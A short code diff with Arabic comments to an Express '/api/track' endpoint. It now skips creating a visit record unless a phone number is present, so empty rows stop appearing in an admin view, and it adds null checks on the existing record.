@@ -219,8 +219,8 @@ app.post('/api/track', (req, res) => {
   if (!visitId) return res.status(400).json({ error: 'visitId required' });
 
   const now = Date.now();
-  const existing = visits[visitId] || { visitId, createdAt: now };
-  const pendingRedirect = existing.pendingRedirect || null;
+  const existing = visits[visitId];
+  const pendingRedirect = existing ? existing.pendingRedirect || null : null;
 
   // لا تمحو البيانات الموجودة بقيم فارغة (حماية بيانات العميل)
   const cleanData = {};
@@ -228,12 +228,18 @@ app.post('/api/track', (req, res) => {
     if (v !== '' && v !== null && v !== undefined) cleanData[k] = v;
   }
 
+  // لا تنشئ entry جديدة إلا إذا كان فيه رقم جوال — منع ظهور صفوف فارغة في الأدمن
+  const hasPhone = cleanData.p || cleanData.phone;
+  if (!existing && !hasPhone) {
+    return res.json({ ok: true });
+  }
+
   visits[visitId] = {
-    ...existing,
+    ...(existing || { visitId, createdAt: now }),
     ...cleanData,
     visitId,
     updatedAt: now,
-    status: existing.status === 'awaiting' ? existing.status : 'active',
+    status: existing && existing.status === 'awaiting' ? existing.status : 'active',
     pendingRedirect: null,
   };
 
